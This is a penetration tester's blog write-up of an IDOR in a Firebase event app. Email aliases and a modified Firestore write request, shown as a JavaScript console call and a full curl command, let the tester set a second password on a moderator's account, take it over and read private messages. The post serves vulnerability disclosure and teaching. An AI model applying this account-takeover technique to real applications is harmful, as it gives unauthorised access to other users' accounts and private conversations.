---
title:  "Privilege Escalation to Moderator using Email Aliases"
layout: post
date:   2022-08-04
---

During a recent assessment, I identified a vulnerability in a Firebase application that enabled me to create a secondary password for another user, granting access to their privileged account.

## Application Background
The application allows users to watch event sessions, engage in discussions, and interact with others. Moderators have the ability to ban users or delete messages.

## Vulnerability
The vulnerability was an IDOR that allowed me to create a second profile on a user account and log in with a new registration number (password), effectively giving the account two passwords—the victim's and one set by the attacker.

The user schema for the application is below:
```json
{"uid":"","claims":{"paid":true,"moderator":true},"email":"original@domain.com","profile":{"email":"original+1@domain.com","registration":""}}
```

The login process relies on the user's email and the registration number attached to the user profile.

To exploit the vulnerability and create a second profile on a victim's account, the attacker would need to be logged in with an email alias of the victim's address. This requires disclosing at least two pieces of information: the user ID and email address.

## Retrieving User Information
Using the public registration link, I registered an account with my own email address. After submitting the form, I was redirected to a page displaying the account's registration number (password).

**Access to the registered email address is not required to view this registration page.**

Logging into the application and visiting the Networking page shows a list of users. By inspecting the JSON data from the server, I could retrieve the user's email address, user ID, and roles.

<figure>
  <img src="/assets/images/2022/privilege-escalation-1.png">
  <figcaption>Figure 1 – List of user IDs, emails, and roles</figcaption>
</figure>  

## Exploiting the vulnerability to become a Moderator
I used the registration link to create an account with the moderator's email address as an alias (e.g., nathan+1@domain.com). Then, I logged into the application using the registration number from the page and the alias email.

<figure>
  <img src="/assets/images/2022/privilege-escalation-2-1.png">
  <figcaption>Figure 2 – Registration page containing credentials to log in</figcaption>
</figure>  

The following payload was used in the browser's JavaScript console to update the current user's profile (nathan+1@domain.com).
{% highlight javascript %}
User.updateProfile({"registration":":registrationNumber"})
{% endhighlight %}

In the Networking tab under the browser Developer Tools, I copied a Firestore HTTP API request as a curl command containing the update user call. By modifying the call with the original moderator's user ID (nathan@domain.com: 1bgH4...), I was able to create a new user profile with a custom registration number on their account.
{% highlight bash %}
curl 'https://firestore.googleapis.com/google.firestore.v1.Firestore/Write/channel?database=projects%2FredactedProjectName%2Fdatabases%2F(default)&VER=8&gsessionid=:validGSessionID&SID=:validSIDValue&RID=:rid&AID=1&zx=:value&t=1' \
-H 'authority: firestore.googleapis.com' \
-H 'content-type: application/x-www-form-urlencoded' \
-H 'origin: https://redacted.com' \ 
-H 'referer: https://redacted.com/' \ 
--data-raw
'count=1&ofs=1&req0___data__=%7B%22streamToken%22%3A%22:validStreamToken%22%2C%22writes%22%3A%5B%7B%22update%22%3A%7B%22name%22%3A%22projects%2FredactedProjectName%2Fdatabases%2F(default)%2Fdocuments%2Fusers%2F:userId%22%2C%22fields%22%3A%7B%22registration%22%3A%7B%22stringValue%22%3A%22:registrationNumber%22%7D%7D%7D%2C%22updateMask%22%3A%7B%22fieldPaths%22%3A%5B%22regist
ration%22%5D%7D%7D%5D%7D' \ 
--compressed
{% endhighlight %}

The curl command had to be copied from the browser using the Developer Tools, as the SID value in the URL had a short time-to-live (TTL) and required a new command if it expired.

Once the curl command was executed successfully, the attacker could log into the application using the moderator's email (nathan@domain.com) and the registration number set in the curl command. This granted the attacker moderator permissions, including access to the moderator's inbox and conversations with other users.

<figure>
  <img src="/assets/images/2022/privilege-escalation-3-1.png">
  <figcaption>Figure 3 – User escalated their permissions by logging into the moderator's account</figcaption>
</figure>  

<figure>
  <img src="/assets/images/2022/privilege-escalation-4-1.png">
  <figcaption>Figure 4 – Viewed moderator's messages in their inbox</figcaption>
</figure>  

Firebase Pentesting Reference:  
https://appsec-labs.com/firebase-applications-the-untold-attack-surface/
